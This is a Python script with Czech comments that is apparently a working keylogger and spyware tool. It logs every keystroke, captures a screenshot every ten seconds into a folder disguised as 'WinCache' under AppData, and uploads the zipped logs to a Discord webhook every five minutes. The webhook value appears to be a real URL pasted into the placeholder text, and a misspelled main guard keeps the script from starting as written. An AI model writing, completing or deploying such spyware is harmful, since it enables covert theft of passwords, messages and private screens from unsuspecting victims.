import os
import time
import threading
import requests
from pynput import keyboard
import pyscreenshot as ImageGrab
from zipfile import ZipFile

# ---------- Nastavení ----------
folder_path = os.path.expanduser("~\\AppData\\Roaming\\WinCache")
os.makedirs(folder_path, exist_ok=True)

webhook_url = "TVŮJ_DISCORD_Whttps://discord.com/api/webhooks/1361740121510117666/_DyL1FKVxwO0SPz59EvVVs4cVeHZ9pEkCa8Hq5K1CHzqa2v2LkEBlFgtS3Yb3rj7KqkxEBHOOK_URL"  # <-- sem dej svůj webhook

# ---------- Keylogger ----------
def log_keys():
    print("Keylogger spuštěn")  # Debug log
    def on_press(key):
        try:
            with open(f"{folder_path}/keys.txt", "a") as f:
                f.write(key.char)
        except:
            with open(f"{folder_path}/keys.txt", "a") as f:
                f.write(f"[{key}]")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ---------- Screenshoty ----------
def capture_screen():
    print("Screenshoty spuštěny")  # Debug log
    while True:
        try:
            img = ImageGrab.grab()
            filename = f"{folder_path}/screen_{int(time.time())}.png"
            img.save(filename)
            print(f"Screenshot uložen: {filename}")  # Debug log
        except Exception as e:
            with open(f"{folder_path}/errors.txt", "a") as f:
                f.write(f"Screenshot error: {e}\n")
            print(f"Chyba při screenshotu: {e}")  # Debug log
        time.sleep(10)

# ---------- Odesílání logů ----------
def send_logs():
    print("Posílání logů spuštěno")  # Debug log
    while True:
        try:
            zip_path = f"{folder_path}.zip"
            with ZipFile(zip_path, 'w') as zipf:
                for filename in os.listdir(folder_path):
                    filepath = os.path.join(folder_path, filename)
                    zipf.write(filepath, arcname=filename)

            with open(zip_path, 'rb') as f:
                requests.post(webhook_url, files={"file": f})

            os.remove(zip_path)
        except Exception as e:
            with open(f"{folder_path}/errors.txt", "a") as f:
                f.write(f"Send error: {e}\n")
            print(f"Chyba při odesílání logů: {e}")  # Debug log
        time.sleep(300)  # každých 5 minut

# ---------- Spuštění ----------
if __name__ == "_main_":
    print("Skript spuštěn")  # Debug log
    threading.Thread(target=log_keys, daemon=True).start()
    threading.Thread(target=capture_screen, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()

    while True:
     time.sleep(1)